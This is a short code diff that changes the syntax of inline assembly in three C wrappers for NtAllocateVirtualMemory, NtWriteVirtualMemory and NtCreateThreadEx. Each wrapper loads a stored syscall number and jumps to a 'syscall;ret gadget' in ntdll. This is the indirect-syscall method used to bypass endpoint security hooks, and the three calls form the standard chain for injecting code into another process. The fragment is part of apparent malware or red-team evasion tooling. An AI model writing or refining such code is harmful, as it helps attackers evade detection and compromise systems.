@@ -76,9 +76,9 @@ NTSTATUS IndirectNtAllocateVirtualMemory(
         ULONG_PTR ZeroBits, PSIZE_T RegionSize,
         ULONG AllocationType, ULONG Protect) {
     __asm__ volatile (
-        "mov eax, %0\n\t"
-        "mov r10, rcx\n\t"
-        "jmp %1\n\t"          // jump to ntdll syscall;ret gadget
+        "movl %0, %%eax\n\t"
+        "movq %%rcx, %%r10\n\t"
+        "jmp *%1\n\t"
         :
         : "m"(ssn_NtAllocateVirtualMemory), "m"(g_syscall_gadget)
         : "rax", "r10"
@@ -92,9 +92,9 @@ NTSTATUS IndirectNtWriteVirtualMemory(
         PVOID Buffer, SIZE_T NumberOfBytesToWrite,
         PSIZE_T NumberOfBytesWritten) {
     __asm__ volatile (
-        "mov eax, %0\n\t"
-        "mov r10, rcx\n\t"
-        "jmp %1\n\t"
+        "movl %0, %%eax\n\t"
+        "movq %%rcx, %%r10\n\t"
+        "jmp *%1\n\t"
         :
         : "m"(ssn_NtWriteVirtualMemory), "m"(g_syscall_gadget)
         : "rax", "r10"
@@ -111,9 +111,9 @@ NTSTATUS IndirectNtCreateThreadEx(
         SIZE_T StackSize, SIZE_T MaximumStackSize,
         PVOID AttributeList) {
     __asm__ volatile (
-        "mov eax, %0\n\t"
-        "mov r10, rcx\n\t"
-        "jmp %1\n\t"
+        "movl %0, %%eax\n\t"
+        "movq %%rcx, %%r10\n\t"
+        "jmp *%1\n\t"
         :
         : "m"(ssn_NtCreateThreadEx), "m"(g_syscall_gadget)
         : "rax", "r10"
